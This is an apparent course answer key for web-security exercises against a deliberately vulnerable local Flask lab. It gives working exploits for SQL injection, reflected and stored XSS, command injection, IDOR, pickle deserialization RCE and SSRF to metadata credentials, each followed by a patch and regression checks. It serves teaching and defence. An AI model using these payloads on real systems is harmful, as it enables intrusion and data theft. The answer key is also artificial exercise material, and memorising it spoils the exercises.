# Exercises — Solutions

> *This document is the answer key for Exercises 1, 2, and 3. Read it after attempting each exercise. If you cannot get an exploit to fire or a patch to take, the relevant section here walks the working version line by line.*

```
+---------------------------------------------------------------------+
|  AUTHORIZED USE ONLY                                                |
|                                                                     |
|  Every payload, command, and patch in this document targets the     |
|  vuln_lab application on your own loopback (127.0.0.1:5000). The    |
|  same payloads sent to a host you do not own are crimes under the   |
|  CFAA, CMA, or Directive 2013/40/EU as applicable. The discipline   |
|  is the rule; the code is just the demonstration.                   |
+---------------------------------------------------------------------+
```

---

## Exercise 1 — Stand Up the Lab and Configure the Proxy

### Part 1 — lab smoke test

The smoke test passes when `curl -s http://127.0.0.1:5000/` returns HTML and the lab terminal shows `127.0.0.1 - - [...] "GET / HTTP/1.1" 200 -`.

If `curl` returns "connection refused":

- Confirm `python3 app.py` is running. Look at the terminal you started it in; you should see Flask's startup banner.
- Confirm the bind address. `app.py` should call `app.run(host="127.0.0.1", port=5000, ...)`. If you accidentally edited it to `0.0.0.0` or a different port, restore.
- `lsof -nP -i :5000` should show a `Python` process. If it shows `nginx` or another server, kill the other one or pick a free port and update `app.py` (and the `LAB_URL` in `regression_test.py` accordingly).

### Part 3 — proxy CA certificate

The most common mistake is importing the CA into the wrong tab of Firefox's certificate manager. The CA goes under **Authorities**. **Servers** is for per-server certificates and will not do what you want. After import you can confirm in Firefox's certificate manager that an entry named "PortSwigger CA" or "OWASP Zed Attack Proxy Root CA" (or similar) is present under Authorities.

### Part 5 — intercept-and-modify

The intercept-and-modify workflow is the keystone of the proxy. If the request does not pause when you toggle Intercept on:

- **Burp:** Make sure both "Intercept is on" *and* the request actually flows through Burp. The proxy listener has to be enabled. Some Burp profiles ship with the listener disabled by default; re-enable in Proxy → Options.
- **ZAP:** The break button needs to be the *global* break, not a path-specific one. The toolbar's main break button intercepts all requests; specific Break Points apply only to the marked URL.

A useful sanity check: in the proxy's HTTP history / Sites tree, do you see *any* requests? If the answer is no, the browser is not actually using the proxy — usually a Firefox profile issue (you configured the proxy in the wrong profile, or your terminal launched the wrong profile).

---

## Exercise 2 — Exploit Each Top-10 Class

### Finding 1: SQLi at `/lookup`

**Working curl:**

```bash
curl -s "http://127.0.0.1:5000/lookup?name=%27%20UNION%20SELECT%20id%2C%20username%2C%20password%20FROM%20users%20--"
```

URL-encoded: `?name=' UNION SELECT id, username, password FROM users --`.

**The response should contain** the substrings `password123`, `letmein`, `admin` — the plaintext passwords from the seed data. If you do not see them, check that:

- The `--` at the end is present and URL-encoded. Without the comment, the trailing `'` in the original query closes the string and SQLite returns a syntax error.
- The column count matches. The original SELECT has three columns (`id, username, email`); your UNION must also have three columns. If you tried `UNION SELECT password FROM users`, SQLite reports a column-count mismatch and you get an error, not data.
- The SQLite version supports UNION (every version does, since 3.0).

**The why.** SQLite (like every relational database driver supporting parameterised queries) keeps user input and query syntax in separate phases of the protocol. When the application concatenates user input into a SQL string, the database has no way to know which characters were data and which were syntax; it parses the whole thing as syntax. The injection adds new clauses that the application never intended.

**The fix (patched query):**

```python
sql: str = "SELECT id, username, email FROM users WHERE username = ?"
rows: list = cursor.execute(sql, (name,)).fetchall()
```

`(name,)` is a one-tuple. `sqlite3` substitutes it into the `?` placeholder at the parameter-binding step, after the SQL has already been parsed. The user's payload is data, not syntax.

### Finding 2: Reflected XSS at `/search`

**Working URL (browser):**

```
http://127.0.0.1:5000/search?q=<script>alert(document.cookie)</script>
```

An alert box fires showing the page's cookies.

**The why.** Flask templates default to autoescape *but* the `Markup(q)` wrapper marks the value as "trusted HTML, do not escape." The template renders the raw `<script>` tag.

**The fix:** drop the `Markup` wrapper. The view function becomes:

```python
return render_template("search.html", q=q, results=[])
```

That is the entire patch.

**Bonus.** Try `?q=<svg onload=alert(1)>` against the *patched* lab. The browser receives `&lt;svg onload=alert(1)&gt;` and renders it as literal text. No alert. Jinja escaped each `<` and `>` and `=` correctly.

### Finding 3: Stored XSS at `/comments`

**Working POST:**

```bash
curl -X POST http://127.0.0.1:5000/comments \
    -d 'body=<script>alert("stored-xss")</script>'
```

Then a GET of `/comments` renders the script for any visitor.

**The why.** The template has `{{ row.body | safe }}`. The `|safe` filter, like `Markup`, tells Jinja "do not escape." The fix is to remove `|safe` so the body is escaped on render.

**The fix:** `templates/comments.html`:

```jinja
{% for row in rows %}
  <li>{{ row.body }}</li>
{% endfor %}
```

You do not need to change the POST handler. The data can remain stored as the user typed it; the encoding is on render. A different defensive style (encode-on-input) is also valid but harder to keep consistent across read paths; OWASP recommends encode-on-output.

### Finding 4: Command injection at `/thumbnail`

**Working curl:**

```bash
curl -s "http://127.0.0.1:5000/thumbnail?file=test.png%3B%20id%20%3E%20%2Ftmp%2Fc6-pwned"
```

URL-decoded: `?file=test.png; id > /tmp/c6-pwned`. After the request, `/tmp/c6-pwned` contains the `id` output.

**The why.** `os.system` invokes `/bin/sh -c <string>`. The shell parses `test.png; id > /tmp/c6-pwned` as two commands separated by `;`. The first (`convert test.png /tmp/out.png`) fails because `test.png` does not exist; the second (`id > /tmp/c6-pwned`) succeeds.

**The fix:**

```python
import subprocess


def _is_safe_filename(name: str) -> bool:
    if not name or name.count(".") != 1 or "/" in name or ".." in name:
        return False
    stem, _, ext = name.partition(".")
    return stem.replace("_", "").replace("-", "").isalnum() and ext.isalnum()


@app.route("/thumbnail")
def thumbnail() -> str:
    filename: str = request.args.get("file", "")
    if not _is_safe_filename(filename):
        return "invalid filename", 400
    result = subprocess.run(
        ["convert", filename, "/tmp/out.png"],
        shell=False,
        capture_output=True,
        timeout=5,
        check=False,
    )
    if result.returncode != 0:
        return "convert failed", 500
    return "done"
```

`shell=False` is the primary defence; the allow-list is the defence-in-depth.

### Finding 5: IDOR at `/profile`

**Working flow:**

```bash
curl -c cookies.txt -X POST http://127.0.0.1:5000/login \
    -d "username=alice&password=password123"
curl -b cookies.txt "http://127.0.0.1:5000/profile?id=2"
```

Alice (id=1) sees Bob's profile (id=2).

**The why.** The endpoint reads `id` from the query string and serves the matching row. It checks `if "user_id" not in session` (the user is logged in) but does *not* check whether the logged-in `user_id` matches the requested `id`.

**The fix:**

```python
@app.route("/profile")
def profile() -> str:
    if "user_id" not in session:
        return redirect(url_for("login"))
    requested_id: int = int(request.args.get("id", "0"))
    session_user_id: int = session["user_id"]
    if requested_id != session_user_id and not _is_admin(session_user_id):
        return "forbidden", 403
    # ... rest unchanged
```

The ownership check is the smallest sound fix. `_is_admin` is a small helper defined in Lecture 3 § 4.1.

### Finding 6: Missing function-level authorization at `/admin/users`

**Working flow:** logged in as `alice`, GET `/admin/users` returns the full user table including plaintext passwords.

**The why.** The endpoint checks login state but not role. The fix is a `_is_admin` gate.

**The fix:**

```python
@app.route("/admin/users")
def admin_users() -> str:
    if "user_id" not in session:
        return redirect(url_for("login"))
    if not _is_admin(session["user_id"]):
        return "forbidden", 403
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    # AFTER: do not select the password column at all.
    rows = cursor.execute("SELECT id, username, email, role FROM users").fetchall()
    conn.close()
    return render_template("admin.html", rows=rows)
```

Two changes in one patch: the role check, and the password column dropped from the SELECT.

### Finding 7: A05 — Werkzeug debugger RCE

**The fix:** remove `debug=True`.

```python
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)
```

Restart. Browse to `/debug-trigger`. The response is now a generic 500 page (or your custom 500 page if you wrote one). No debugger.

### Finding 8: A07 — no rate limit on `/login`

**The fix:** the rate limiter and the Argon2id password hashing from Lecture 3 § 6. The whole `/login` handler becomes:

```python
@app.route("/login", methods=["GET", "POST"])
def login() -> str:
    if request.method == "POST":
        if not _rate_limit_allow(request.remote_addr or "unknown"):
            return "too many attempts; try again later", 429
        username: str = request.form.get("username", "")
        password: str = request.form.get("password", "")
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        row = cursor.execute(
            "SELECT id, password FROM users WHERE username = ?",
            (username,),
        ).fetchone()
        conn.close()
        if row is None:
            return "bad credentials", 401
        try:
            _HASHER.verify(row[1], password)
        except VerifyMismatchError:
            return "bad credentials", 401
        session["user_id"] = row[0]
        session["token"] = secrets.token_urlsafe(32)
        return redirect(url_for("index"))
    return render_template("login.html")
```

With `_HASHER`, `_LOGIN_ATTEMPTS`, and `_rate_limit_allow` defined at module scope per Lecture 3 § 6.2.

**Migrating the existing users.** `init_db.py` must be updated to write Argon2id hashes, not plaintext. The patched `init_db.py` calls `_HASHER.hash(plaintext)` for each seed user and stores the resulting `$argon2id$...$...` string. After the migration, the regression script's `verify_no_plaintext_passwords` check passes.

### Finding 9: A08 — pickle deserialization

**Working payload-builder:**

```python
import base64, pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("touch /tmp/c6-pickle-pwned",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

POST the base64 string as the `blob` parameter; `/tmp/c6-pickle-pwned` appears.

**The fix:** swap pickle for JSON, validate the schema:

```python
import json
from typing import Any

@app.route("/import-profile", methods=["POST"])
def import_profile() -> str:
    blob: str = request.form.get("blob", "")
    if len(blob) > 4096:
        return "blob too large", 413
    try:
        data: Any = json.loads(blob)
    except json.JSONDecodeError:
        return "invalid json", 400
    if not isinstance(data, dict):
        return "expected json object", 400
    username: Any = data.get("username", "")
    if not isinstance(username, str) or not username.isalnum() or len(username) > 64:
        return "invalid username", 400
    return f"imported profile for {username}"
```

`json.loads` cannot execute code; pickle's `__reduce__` mechanism does not exist in JSON. The malicious blob now fails to parse (it is not valid JSON), and the endpoint returns 400.

### Finding 10: A10 — SSRF at `/fetch-image`

**Working exploit:**

```bash
curl -s "http://127.0.0.1:5000/fetch-image?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/lab-role"
```

The mock metadata server's fake credentials are returned.

**The fix:** the allow-list-plus-IP-validation pattern from Lecture 3 § 8.1. The full patched function and helpers are in that section; key points:

- `ALLOWED_HOSTS` is empty by default in the patched lab — or holds two example domains that do not resolve. Either way, the SSRF exploit returns `400 "destination not allowed"`.
- If you want the patched lab to allow *some* hosts (for instance, you actually want `/fetch-image` to work for a legitimate purpose), add the legitimate hostname to `ALLOWED_HOSTS` and confirm that the hostname's IP is not in the blocked-nets list.
- For the regression test we want the SSRF to fail; the empty allow-list achieves that.

---

## Exercise 3 — Patch and Regress

### The regression run, in order

1. Make the patches in order P1 through P9 (per `--guide` output). Restart the lab between each patch.
2. After each patch, run `python3 exercise-03-patch-and-regress.py --regress`. The corresponding test should flip from FAIL to PASS.
3. After all nine patches, the suite should report `9/9 exploits closed.`

(There are nine tests for eight bug classes because P5 is split into IDOR + missing-authz, which the test suite tests separately.)

### The "exploits closed" output

Expected after all patches:

```text
Regression suite against http://127.0.0.1:5000
------------------------------------------------------------------------------
  [PASS] P1 SQLi at /lookup
         patch holds: UNION did not execute
  [PASS] P2 Reflected XSS at /search
         patch holds: autoescape encoded the payload
  [PASS] P3 Stored XSS at /comments
         patch holds: stored comment is encoded on render
  [PASS] P4 Command injection at /thumbnail
         patch holds: shell metacharacters did not execute
  [PASS] P5a IDOR at /profile
         patch holds: 403 returned for cross-user profile read
  [PASS] P5b Missing authz at /admin/users
         patch holds: status 403
  [PASS] P7 Rate limit at /login
         patch holds: rate limit fired (5 of 10 returned 429)
  [PASS] P8 Pickle deserialization at /import-profile
         patch holds: pickle rejected, JSON path responded
  [PASS] P9 SSRF at /fetch-image
         patch holds: 400 returned for disallowed destination
------------------------------------------------------------------------------
  9/9 exploits closed.
```

If you see any FAILs after applying all the patches, the test's note line tells you what went wrong: which canary file appeared, which password leaked, which status code came back. Walk back through the corresponding patch.

### The `--check-db` flag

`python3 exercise-03-patch-and-regress.py --regress --check-db --db mini-project/starter/lab.db`

This verifies that the `users.password` column no longer holds plaintext. The check looks for the `$argon2id$` prefix on every row. If `init_db.py` was not updated to hash passwords, the check fails. The remediation is the `init_db.py` patch from Lecture 3 § 5.2 and the migration helper in this file's "Finding 8" subsection.

---

## A note on the missing P6 patch in the test suite

The test suite has no `P6` test for security misconfiguration because misconfigurations like `debug=True`, missing security headers, and default credentials are easier to verify by inspection than by an HTTP test:

- **Headers**: `curl -sI http://127.0.0.1:5000/ | grep -iE 'content-security-policy|x-frame-options'`. They should be present after the patch.
- **Debug**: `curl -s http://127.0.0.1:5000/debug-trigger | head -c 200`. The response should be a short generic page, not the long Werkzeug debugger HTML.
- **Default creds**: `curl -X POST -d "username=admin&password=admin" http://127.0.0.1:5000/login`. Should return 401, not 302.

If you want a test in the suite for these, copy the pattern of `test_no_rate_limit` and add three new functions. The script's `TESTS` list is the only place you need to register them.

---

## Final checks before moving to the mini-project

1. The regression run shows 9/9 PASS.
2. The `--check-db` flag (run separately) confirms no plaintext passwords.
3. The lab still works for legitimate use: you can log in as `alice` with `password123`, view your own profile, post a comment, search.
4. The CSP header appears in every response.
5. `debug=True` is gone from `app.py`.

If all five hold, the patched lab is the form you ship in the mini-project. Move on to Friday's session.
